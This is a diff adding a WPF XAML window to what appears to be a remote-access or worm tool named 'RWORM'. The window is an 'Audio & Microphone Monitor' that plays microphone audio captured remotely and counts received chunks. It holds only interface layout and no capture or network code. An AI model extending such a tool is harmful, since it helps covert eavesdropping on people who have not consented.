@@ -1,0 +1,53 @@
+<Window x:Class="RWORM.GUI.Views.AudioMonitorWindow"
+        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+        Height="420" Width="600"
+        WindowStartupLocation="CenterScreen"
+        Background="#0F172A" Foreground="#FFFFFF"
+        Title="Audio &amp; Microphone Monitor">
+    <Grid>
+        <Grid.RowDefinitions>
+            <RowDefinition Height="50"/>
+            <RowDefinition Height="*"/>
+            <RowDefinition Height="34"/>
+        </Grid.RowDefinitions>
+
+        <!-- Top Bar -->
+        <Border Grid.Row="0" Background="#1E293B" BorderBrush="#334155" BorderThickness="0,0,0,1">
+            <DockPanel Margin="16,0">
+                <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
+                    <TextBlock x:Name="TitleLabel" Text="Audio Monitor" FontSize="14" FontWeight="SemiBold"
+                               Foreground="#FFFFFF" VerticalAlignment="Center" Margin="0,0,16,0"/>
+
+                    <Button x:Name="ListenBtn" Content="⏹ Stop Listening" Click="Listen_Click"
+                            Style="{StaticResource DangerButton}" Height="30" Padding="14,4" Margin="0,0,8,0"/>
+                </StackPanel>
+
+                <StackPanel Orientation="Horizontal" HorizontalAlignment="Right" VerticalAlignment="Center">
+                    <TextBlock Text="Chunks Received: " Foreground="#94A3B8" FontSize="12"/>
+                    <TextBlock x:Name="ChunkCountLabel" Text="0" Foreground="#10B981" FontWeight="SemiBold" FontSize="12"/>
+                </StackPanel>
+            </DockPanel>
+        </Border>
+
+        <!-- Visualizer Area -->
+        <Border Grid.Row="1" Background="#0B0F19" Margin="16" CornerRadius="8" Padding="20">
+            <Grid>
+                <StackPanel VerticalAlignment="Center" HorizontalAlignment="Center">
+                    <Ellipse x:Name="AudioPulse" Width="70" Height="70" Fill="#10B981" Opacity="0.3"
+                             HorizontalAlignment="Center" Margin="0,0,0,20"/>
+                    <TextBlock Text="Live Microphone &amp; Audio Stream" FontSize="16" FontWeight="SemiBold"
+                               Foreground="#FFFFFF" HorizontalAlignment="Center"/>
+                    <TextBlock Text="Audio captured remotely is automatically played through your system speakers in real-time."
+                               FontSize="12" Foreground="#94A3B8" HorizontalAlignment="Center" Margin="0,8,0,0"
+                               TextWrapping="Wrap" TextAlignment="Center" MaxWidth="440"/>
+                </StackPanel>
+            </Grid>
+        </Border>
+
+        <!-- Status bar -->
+        <Border Grid.Row="2" Background="#1E293B" BorderBrush="#334155" BorderThickness="0,1,0,0">
+            <TextBlock x:Name="StatusLabel" Foreground="#94A3B8" FontSize="11.5" VerticalAlignment="Center" Margin="16,0"/>
+        </Border>
+    </Grid>
+</Window>
